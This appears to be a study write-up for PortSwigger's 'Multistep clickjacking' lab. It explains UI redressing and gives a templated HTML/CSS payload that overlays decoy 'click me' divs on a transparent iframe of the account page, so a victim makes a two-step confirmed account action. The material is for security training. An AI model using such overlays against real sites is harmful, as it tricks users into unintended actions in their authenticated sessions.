# Lab: Multistep clickjacking

**Official PortSwigger URL:** https://portswigger.net/web-security/clickjacking/lab-multistep

## Lab idea

This challenge involves a CSRF-token-protected account action followed by a confirmation dialog. Its concept is to examine how a clickjacking scenario can depend on a sequence of user interactions rather than one click. It practices reasoning about multi-stage interface flows and their potential for deceptive overlays.

## Vulnerability in brief
Clickjacking, also called **UI redressing** (user-interface redressing), is an interface-based attack in which a person is tricked into activating a control on a hidden website while believing they are clicking something else on a decoy page. A common mechanism is to place a target page inside an iframe and layer the decoy content over it. Layout, stacking order, and transparency can make an actionable target control line up with the apparent decoy control. The click is still a real user action within the target site's authenticated session.

## Solution idea
1. Log in to your account on the target website and go to the user account page.
2. Go to the exploit server and paste the following HTML template into the "Body" section: <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity…
3. Make the following adjustments to the template:
4. Click Store and then View exploit .
5. Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly.
6. Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly.
7. Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click Store on the exploit server.
8. Now click on Deliver exploit to victim and the lab should be solved.

## Payloads / key values
- `<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } .firstClick, .secondClick { position:absolute; top:$top_value1; left:$side_value1; z-index: 1; } .secondClick { top:$top_value2; left:$side_value2; } </style> <div class="firstClick">Test me first</div> <div class="secondClick">Test me next</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`
- `YOUR-LAB-ID`
- `$width_value`
- `$height_value`
- `$top_value1`
- `$side_value1`
- `$top_value2`
- `$side_value2`
- `$opacity`
- `firstClick`
- `secondClick`

## Official source
- [PortSwigger Academy: Lab: Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
